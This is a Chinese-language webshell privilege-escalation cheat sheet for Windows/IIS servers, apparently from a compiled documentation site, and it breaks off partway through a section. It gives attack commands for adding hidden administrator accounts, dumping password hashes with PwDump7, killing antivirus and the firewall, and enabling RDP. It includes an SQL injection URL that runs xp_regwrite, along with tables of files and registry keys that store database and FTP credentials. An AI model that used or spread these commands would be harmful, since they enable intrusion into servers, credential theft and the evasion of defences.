(window.webpackJsonp=window.webpackJsonp||[]).push([[200],{488:function(s,t,a){"use strict";a.r(t);var n=a(7),e=Object(n.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"asp-web提权"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#asp-web提权"}},[s._v("#")]),s._v(" ASP Web提权")]),s._v(" "),t("h2",{attrs:{id:"web提权"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#web提权"}},[s._v("#")]),s._v(" web提权")]),s._v(" "),t("p",[s._v("1.能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行"),t("code",[s._v("/c c:\\windows\\temp\\cookies\\net1.exe user")])]),s._v(" "),t("p",[s._v("2.当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了。")]),s._v(" "),t("p",[s._v("3.cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，"),t("code",[s._v("cmd.exe/cmd.com/cmd.txt")]),s._v(" 都可以。")]),s._v(" "),t("p",[s._v("4.cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权。")]),s._v(" "),t("p",[s._v("6.c:\\windows\\temp\\cookies\\  这个目录")]),s._v(" "),t("p",[s._v("7.找sa密码或是root密码，直接利用大马的文件搜索功能直接搜索，超方便！")]),s._v(" "),t("p",[s._v("8.cmd执行exp没回显的解决方法：com路径那里输入exp路径C:\\RECYCLER\\pr.exe，命令那里清空(包括/c )输入"),t("code",[s._v("net user jianmei daxia /add")])]),s._v(" "),t("p",[s._v("9.增加用户并提升为管理员权限之后，如果连接不上3389，上传rootkit.asp脚本，访问会提示登录，用提权成功的账号密码登录进去就可以拥有管理员权限了。")]),s._v(" "),t("p",[s._v("10.有时变态监控不让添加用户，可以尝试抓管理哈希值，上传“PwDump7 破解当前管理密码(hash值)”，俩个都上传，执行PwDump7.exe就可以了，之后到网站去解密即可。")]),s._v(" "),t("p",[s._v("11.有时增加不上用户，有可能是密码过于简单或是过于复杂，还有就是杀软的拦截，命令 tasklist 查看进程")]),s._v(" "),t("p",[s._v("12.其实星外提权只要一个可执行的文件即可，先运行一遍cmd，之后把星外ee.exe命名为log.csv 就可以执行了。")]),s._v(" "),t("p",[s._v("13.用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令。")]),s._v(" "),t("p",[s._v("14.提权很无奈的时候，可以试试TV远控，通杀内外网，穿透防火墙，很强大的。")]),s._v(" "),t("p",[s._v("15.当可读可写目录存在空格的时候，会出现这样的情况：’C:\\Documents’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决办法是利用菜刀的交互shell切换到exp路径，如："),t("code",[s._v("Cd C:\\Documents and Settings\\All Users\\Application Data\\Microsoft")]),s._v(" 目录\n然后再执行exp或者cmd，就不会存在上面的情况了，aspshell一般是无法跳转目录的～")]),s._v(" "),t("p",[s._v("16.有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，"),t("code",[s._v("net user administrator")]),s._v("看下本地组成员，*administrators")]),s._v(" "),t("p",[s._v("17.进入服务器，可以继续内网渗透  这个时候可以尝试打开路由器 默认帐号密码 admin  admin")]),s._v(" "),t("p",[s._v("18.有的cmd执行很变态，asp马里，cmd路径填上面，下面填："),t("code",[s._v('”"c:\\xxx\\exp.exe “whoami”')]),s._v("  记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在cmd那里，下面不变。")]),s._v(" "),t("p",[s._v("19.一般增加不上用户，或是想添加增加用户的vbs,bat,远控小马到服务器的启动项里，用“直接使服务器蓝屏重启的东东”这个工具可以实现，")]),s._v(" "),t("p",[s._v("20.执行PwDump7.exe抓哈希值的时候，建议重定向结果到保存为1.txt /c "),t("code",[s._v("c:\\windows\\temp\\cookies\\PwDump7.exe >1.txt")])]),s._v(" "),t("p",[s._v("21.菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后"),t("code",[s._v("setp c:\\windows\\temp\\cmd.exe")]),s._v(" 设置终端路径为："),t("code",[s._v("c:\\windows\\temp\\cmd.exe")])]),s._v(" "),t("p",[s._v("22.当不支持aspx，或是支持但跨不了目录的时候，可以上传一个读iis的vps，执行命令列出所有网站目录，找到主站的目录就可以跨过去了。\n上传cscript.exe到可执行目录，接着上传iispwd.vbs到网站根目录，cmd命令/c")]),s._v(" "),t("p",[t("code",[s._v("“c:\\windows\\temp\\cookies\\cscript.exe” d:\\web\\iispwd.vbs")])]),s._v(" "),t("p",[s._v("23.如何辨别服务器是不是内网？ 192.168.x.x    172.16.x.x    10.x.x.x")]),s._v(" "),t("h2",{attrs:{id:"dos命令大全"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#dos命令大全"}},[s._v("#")]),s._v(" dos命令大全")]),s._v(" "),t("p",[s._v("查看版本："),t("code",[s._v("ver")])]),s._v(" "),t("p",[s._v("查看权限："),t("code",[s._v("whoami")])]),s._v(" "),t("p",[s._v("查看配置："),t("code",[s._v("systeminfo")])]),s._v(" "),t("p",[s._v("查看用户："),t("code",[s._v("net user")])]),s._v(" "),t("p",[s._v("查看进程："),t("code",[s._v("tasklist")])]),s._v(" "),t("p",[s._v("查看正在运行的服务："),t("code",[s._v("tasklist /svc")])]),s._v(" "),t("p",[s._v("查看开放的所有端口："),t("code",[s._v("netstat -ano")])]),s._v(" "),t("p",[s._v("查询管理用户名："),t("code",[s._v("query user")])]),s._v(" "),t("p",[s._v("查看搭建环境："),t("code",[s._v("ftp 127.0.0.1")])]),s._v(" "),t("p",[s._v("查看指定服务的路径："),t("code",[s._v("sc qc Mysql")])]),s._v(" "),t("p",[s._v("添加一个用户："),t("code",[s._v("net user jianmei daxia.asd /add")])]),s._v(" "),t("p",[s._v("提升到管理权限："),t("code",[s._v("net localgroup administrators jianmei /add")])]),s._v(" "),t("p",[s._v("添加用户并提升权限："),t("code",[s._v("net user jianmei daxia.asd /add & net localgroup administrators jianmei /add")])]),s._v(" "),t("p",[s._v("查看制定用户信息："),t("code",[s._v("net user jianmei")])]),s._v(" "),t("p",[s._v("查看所有管理权限的用户："),t("code",[s._v("net localgroup administrators")])]),s._v(" "),t("p",[s._v("加入远程桌面用户组："),t("code",[s._v("net localgroup “Remote Desktop Users” jianmei /add")])]),s._v(" "),t("p",[s._v("突破最大连接数："),t("code",[s._v("mstsc /admin /v:127.0.0.1")])]),s._v(" "),t("p",[s._v("删除用户："),t("code",[s._v("net user jianmei /del")])]),s._v(" "),t("p",[s._v("删除管理员账户:"),t("code",[s._v("net user administrator daxia.asd")])]),s._v(" "),t("p",[s._v("更改系统登陆密码："),t("code",[s._v("net password daxia.asd")])]),s._v(" "),t("p",[s._v("激活GUEST用户："),t("code",[s._v("net user guest /active:yes")])]),s._v(" "),t("p",[s._v("开启TELNET服务："),t("code",[s._v("net start telnet")])]),s._v(" "),t("p",[s._v("关闭麦咖啡："),t("code",[s._v("net stop “McAfee McShield”")])]),s._v(" "),t("p",[s._v("关闭防火墙："),t("code",[s._v("net stop sharedaccess")])]),s._v(" "),t("p",[s._v("查看当前目录的所有文件："),t("code",[s._v("dir c:\\windows\\")])]),s._v(" "),t("p",[s._v("查看制定文件的内容："),t("code",[s._v("type c:\\windows\\1.asp")])]),s._v(" "),t("p",[s._v("把cmd.exe复制到c:\\windows的temp目录下并命名为cmd.txt："),t("code",[s._v("copy c:\\windows\\temp\\cookies\\cmd.exe c:\\windows\\temp\\cmd.txt")])]),s._v(" "),t("p",[s._v("开3389端口的命令："),t("code",[s._v("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f")])]),s._v(" "),t("p",[s._v("查看补丁："),t("code",[s._v("dir c:\\windows\\>a.txt&(for %i in (KB952004.log KB956572.log KB2393802.log KB2503665.log KB2592799.log KB2621440.log KB2160329.log KB970483.log KB2124261.log KB977165.log KB958644.log) do @type a.txt|@find /i “%i”||@echo %i Not Installed!)&del /f /q /a a.txt")])]),s._v(" "),t("h2",{attrs:{id:"sql语句直接开启3389"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#sql语句直接开启3389"}},[s._v("#")]),s._v(" SQL语句直接开启3389")]),s._v(" "),t("p",[s._v("3389登陆关键注册表位置：")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("HKEY_LOCAL_MACHINE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SYSTEM"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("CurrentControlSet"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Control"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("TerminalServer"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("DenyTSConnections\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("其中键值DenyTSConnections 直接控制着3389的开启和关闭，当该键值为0表示3389开启，1则表示关闭。")]),s._v(" "),t("p",[s._v("而MSSQL的xp_regwrite的存储过程可以对注册进行修改，我们使用这点就可以简单的修改DenyTSConnections键值，从而控制3389的关闭和开启。")]),s._v(" "),t("p",[s._v("开启3389的SQL语句：")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("syue.com/xiaohua.asp?id"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("100")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exec")]),s._v(" master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'SYSTEM\\CurrentControlSet\\Control\\Terminal Server’,'")]),s._v("fDenyTSConnections’,'REG_DWORD’,0"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("–\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("关闭3389的SQL语句：")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("syue.com/xiaohua.asp?id"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("100")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exec")]),s._v(" master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'SYSTEM\\CurrentControlSet\\Control\\Terminal Server’,'")]),s._v("fDenyTSConnections’,'REG_DWORD’,1"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("–\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"常见杀软"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#常见杀软"}},[s._v("#")]),s._v(" 常见杀软")]),s._v(" "),t("ul",[t("li",[s._v("360tray.exe  360实时保护")]),s._v(" "),t("li",[s._v("ZhuDongFangYu.exe  360主动防御")]),s._v(" "),t("li",[s._v("KSafeTray.exe  金山卫士")]),s._v(" "),t("li",[s._v("McAfee McShield.exe  麦咖啡")]),s._v(" "),t("li",[s._v("SafeDogUpdateCenter.exe  服务器安全狗")])]),s._v(" "),t("h2",{attrs:{id:"windows提权中敏感目录和敏感注册表的利用"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#windows提权中敏感目录和敏感注册表的利用"}},[s._v("#")]),s._v(" Windows提权中敏感目录和敏感注册表的利用")]),s._v(" "),t("table",[t("thead",[t("tr",[t("th",[s._v("敏感目录")]),s._v(" "),t("th",[s._v("目录权限")]),s._v(" "),t("th",[s._v("提权用途")])])]),s._v(" "),t("tbody",[t("tr",[t("td",[s._v("C:\\Program Files\\")]),s._v(" "),t("td",[s._v("默认用户组users对该目录拥有查看权")]),s._v(" "),t("td",[s._v("可以查看服务器安装的应用软件")])]),s._v(" "),t("tr",[t("td",[s._v("C:\\Documents and Settings\\All Users\\「开始」菜单\\程序")]),s._v(" "),t("td",[s._v("Everyone拥有查看权限")]),s._v(" "),t("td",[s._v("存放快捷方式，可以下载文件，属性查看安装路径")])]),s._v(" "),t("tr",[t("td",[s._v("C:\\Documents and Settings\\All Users\\Documents")]),s._v(" "),t("td",[s._v("Everyone完全控制权限")]),s._v(" "),t("td",[s._v("上传执行cmd及exp")])]),s._v(" "),t("tr",[t("td",[s._v("C:\\windows\\system32\\inetsrv\\")]),s._v(" "),t("td",[s._v("Everyone完全控制权限")]),s._v(" "),t("td",[s._v("上传执行cmd及exp")])]),s._v(" "),t("tr",[t("td",[s._v("C:\\windows\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini")]),s._v(" "),t("td",[s._v("默认用户组users拥有查看权限")]),s._v(" "),t("td",[s._v("安装mysql时会将root密码写入该文件")])]),s._v(" "),t("tr",[t("td",[s._v("C:\\windows\\system32\\")]),s._v(" "),t("td",[s._v("默认用户组users拥有查看权限")]),s._v(" "),t("td",[s._v("Shift后门一般是在该文件夹，可以下载后门破解密码")])]),s._v(" "),t("tr",[t("td",[s._v("C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动")]),s._v(" "),t("td",[s._v("Everyone拥有查看权限")]),s._v(" "),t("td",[s._v("可以尝试向该目录写入vbs或bat，服务器重启后运行。")])]),s._v(" "),t("tr",[t("td",[s._v("C:\\RECYCLER\\D:\\RECYCLER\\")]),s._v(" "),t("td",[s._v("Everyone完全控制权限")]),s._v(" "),t("td",[s._v("回收站目录。常用于执行cmd及exp")])]),s._v(" "),t("tr",[t("td",[s._v("C:\\Program Files\\Microsoft SQL Server\\")]),s._v(" "),t("td",[s._v("默认用户组users对该目录拥有查看权限")]),s._v(" "),t("td",[s._v("收集mssql相关信息，有时候该目录也存在可执行权限")])]),s._v(" "),t("tr",[t("td",[s._v("C:\\Program Files\\MySQL\\")]),s._v(" "),t("td",[s._v("默认用户组users对该目录拥有查看权限")]),s._v(" "),t("td",[s._v("找到MYSQL目录中user.MYD里的root密码")])]),s._v(" "),t("tr",[t("td",[s._v("C:\\oraclexe\\")]),s._v(" "),t("td",[s._v("默认用户组users对该目录拥有查看权限")]),s._v(" "),t("td",[s._v("可以尝试利用Oracle的默认账户提权")])]),s._v(" "),t("tr",[t("td",[s._v("C:\\WINDOWS\\system32\\config")]),s._v(" "),t("td",[s._v("默认用户组users对该目录拥有查看权限")]),s._v(" "),t("td",[s._v("尝试下载sam文件进行破解提权")])]),s._v(" "),t("tr",[t("td",[s._v("C:\\Program Files\\Geme6 FTP Server\\Remote Admin\\Remote.ini")]),s._v(" "),t("td",[s._v("默认用户组users对该目录拥有查看权限")]),s._v(" "),t("td",[s._v("Remote.ini文件中存放着G6FTP的密码")])]),s._v(" "),t("tr",[t("td",[s._v("c:\\Program Files\\RhinoSoft.com\\Serv-U\\c:\\Program Files\\Serv-U\\")]),s._v(" "),t("td",[s._v("默认用户组users对该目录拥有查看权限")]),s._v(" "),t("td",[s._v("ServUDaemon.ini 中存储了虚拟主机网站路径和密码")])]),s._v(" "),t("tr",[t("td",[s._v("C:\\windows\\system32\\inetsrv\\MetaBase.xml")]),s._v(" "),t("td",[s._v("默认用户组users对该目录拥有查看权限")]),s._v(" "),t("td",[s._v("IIS配置文件")])]),s._v(" "),t("tr",[t("td",[s._v("C:tomcat\\conf\\resin.conf")]),s._v(" "),t("td",[s._v("默认用户组users对该目录拥有查看权限")]),s._v(" "),t("td",[s._v("Tomat存放密码的位置")])]),s._v(" "),t("tr",[t("td",[s._v("C:\\ZKEYS\\Setup.ini")]),s._v(" "),t("td",[s._v("默认用户组users对该目录拥有查看权限")]),s._v(" "),t("td",[s._v("ZKEYS虚拟主机存放密码的位置")])])])]),s._v(" "),t("h2",{attrs:{id:"提权中的敏感注册表位置"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#提权中的敏感注册表位置"}},[s._v("#")]),s._v(" 提权中的敏感注册表位置")]),s._v(" "),t("p",[s._v("Mssql端口")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("HKEY_LOCAL_MACHINE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SOFTWARE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Microsoft"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("MSSQLServer"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("MSSQLServer"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SuperSocketNetLib"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Tcp    \n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("远程终端 值为0 即为开启")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("HKLM"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SYSTEM"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("CurrentControlSet"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Control"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Terminal Server DenyTSConnections         \n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("mssql的注册表位置")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("HKEY_LOCAL_MACHINE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SOFTWARE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("MySQL AB"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("  \n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("华众主机注册表配置位置")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("HKEY_LOCAL_MACHINE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SOFTWARE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("HZHOST"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("CONFIG"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("    \n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("serv-u的用户及密码（su加密）位置")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("HKEY_LOCAL_MACHINE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SOFTWARE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Cat Soft"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Serv-U"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Domains"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("UserList"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("   \n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("在该注册表位置PortNumber的值即位3389端口值")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("HKEY_LOCAL_MACHINE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SYSTEM"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("CurrentControlSet"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Control"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("TerminalServer"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" WinStations"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("RDP-Tcp\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("mysql管理工具Navicat的注册表位置，提权运用请谷歌")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("HKEY_CURRENT_USER"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Software"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("PremiumSoft"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Navicat"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Servers\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("Radmin的配置文件，提权中常将其导出进行进行覆盖提权")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("HKEY_LOCAL_MACHINE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SYSTEM"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("RAdmin"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("v2.0"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Server"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Parameters   \n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("IIS注册表全版本泄漏用户路径和FTP用户名漏洞")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("HKEY_LOCAL_MACHINE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SYSTEM"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ControlSet002"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Services"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("MSFtpsvc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Parameters"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Virtual Roots"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("      \n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("华众主机在注册表中保存的mssql、mysql等密码")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("HKEY_LOCAL_MACHINE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("software"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("hzhost"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("config"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Settings"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("mastersvrpass  \n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("星外主机mssql 的sa账号密码，双MD5加密")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("HKEY_LOCAL_MACHINE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SYSTEM"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("LIWEIWENSOFT"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("INSTALLFREEADMIN"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("11")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("星外ftp的注册表位置，当然也包括ControlSet001、ControlSet003")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("HKEY_LOCAL_MACHINE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SYSTEM"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ControlSet002"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Services"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("MSFtpsvc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Parameters"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Virtual Roots"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ControlSet002  \n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"wscript-shell的删除和恢复"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#wscript-shell的删除和恢复"}},[s._v("#")]),s._v(" wscript.shell的删除和恢复")]),s._v(" "),t("p",[s._v("载wscript.shell对象，在cmd下或直接运行："),t("code",[s._v("regsvr32 /u %windir%\\system32\\WSHom.Ocx")])]),s._v(" "),t("p",[s._v("卸载FSO对象，在cmd下或直接运行："),t("code",[s._v("regsvr32.exe /u %windir%\\system32\\scrrun.dll")])]),s._v(" "),t("p",[s._v("卸载stream对象，在cmd下或直接运行："),t("code",[s._v("regsvr32 /s /u “C:\\ProgramFiles\\CommonFiles\\System\\ado\\msado15.dll”")])]),s._v(" "),t("p",[s._v("如果想恢复的话只需要去掉/U 即可重新再注册以上相关ASP组件，这样子就可以用了")]),s._v(" "),t("h2",{attrs:{id:"如何找到准确的终端连接端口"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#如何找到准确的终端连接端口"}},[s._v("#")]),s._v(" 如何找到准确的终端连接端口？")]),s._v(" "),t("p",[s._v("在aspx大马里，点击“系统信息”第三个就是目前的3389端口")]),s._v(" "),t("p",[s._v("或是执行命令查看正在运行的服务："),t("code",[s._v("tasklist /svc")])]),s._v(" "),t("p",[s._v("找到："),t("code",[s._v("svchost.exe 1688 TermService")])]),s._v(" "),t("p",[s._v("记住1688这个ID值，")]),s._v(" "),t("p",[s._v("查看开放的所有端口："),t("code",[s._v("netstat -ano")])]),s._v(" "),t("p",[s._v("找到1688这个ID值所对应的端口就是3389目前的端口")]),s._v(" "),t("h2",{attrs:{id:"iis6提权提示can-not-find-wmiprvse-exe的突破方法"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#iis6提权提示can-not-find-wmiprvse-exe的突破方法"}},[s._v("#")]),s._v(" iis6提权提示Can not find wmiprvse.exe的突破方法")]),s._v(" "),t("p",[t("strong",[s._v("突破方法一：")])]),s._v(" "),t("p",[s._v("在IIS环境下，如果权限做得不严格，我们在aspx大马里面是有权限直接结束wmiprvse.exe进程的，进程查看里面直接K掉")]),s._v(" "),t("p",[s._v("在结束之后，它会再次运行，这时候的PID值的不一样的。这时候我们回来去运行exp，直接秒杀。")]),s._v(" "),t("p",[t("strong",[s._v("突破方法二：")])]),s._v(" 